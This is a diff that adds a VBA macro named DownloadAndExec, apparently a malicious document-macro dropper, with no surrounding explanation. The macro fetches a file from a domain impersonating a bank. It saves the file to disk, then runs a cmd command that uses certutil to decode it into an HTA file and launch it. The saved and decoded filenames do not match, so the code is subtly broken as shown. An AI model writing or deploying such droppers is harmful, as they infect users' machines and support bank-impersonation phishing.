@@ -1,0 +1,17 @@
+Sub DownloadAndExec()
+
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "http://bankofthewest.online/botwe.crt", False
+xHttp.Send
+
+With bStrm
+    .Type = 1 '//binary
+    .Open
+    .write xHttp.responseBody
+    .savetofile "encoded.crt", 2 '//overwrite
+End With
+
+Shell ("cmd /c certutil -decode botwe.crt botwe.hta & start botwe.hta")
+
+End Sub
